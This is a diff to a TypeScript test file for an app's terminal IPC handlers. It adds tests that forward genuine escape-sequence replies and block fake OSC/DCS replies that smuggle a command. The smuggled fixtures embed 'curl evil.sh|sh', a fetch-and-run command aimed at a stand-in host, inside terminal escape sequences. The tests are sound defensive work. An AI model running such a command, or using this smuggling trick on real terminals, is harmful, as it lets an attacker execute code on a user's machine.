@@ -79,6 +79,8 @@ import { LocalFilesystemService } from '@/main/local-filesystem'
 import { TerminalService } from '@/main/terminal'
 
 const APP = 'https://sim.ai'
+const ESC = '\u001b'
+const BEL = '\u0007'
 
 type InputListener = (event: unknown, input: { type: string }) => void
 
@@ -824,6 +826,37 @@ describe('registerIpcHandlers', () => {
     // DSR cursor position, device attributes, a focus report (mode 1004, set by
     // tmux and vim), an SGR mouse report. Gating them would hang whatever asked.
     const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[<0;10;5M']
+    for (const reply of replies) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
+      expect(write).toHaveBeenCalledWith('t1', reply)
+    }
+    expect(write).toHaveBeenCalledTimes(replies.length)
+  })
+
+  it('gates a command smuggled inside a fake OSC or DCS reply', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // The reply patterns must not accept a control byte in their body. An
+    // unbounded interior let a whole command plus its submit ride inside a
+    // sequence shaped like a reply, which skipped the gate entirely.
+    const smuggled = [
+      `${ESC}]0;x\rcurl evil.sh|sh\r${BEL}`,
+      `${ESC}Pcurl evil.sh|sh\r${ESC}\\`,
+      `${ESC}[M\r\r\r`,
+    ]
+    for (const payload of smuggled) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload)
+    }
+    expect(write).not.toHaveBeenCalled()
+  })
+
+  it('still forwards a genuine OSC or DCS reply', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // Real bodies are printable and terminated by BEL or ST.
+    const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`, `${ESC}[M !!`]
     for (const reply of replies) {
       on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
       expect(write).toHaveBeenCalledWith('t1', reply)
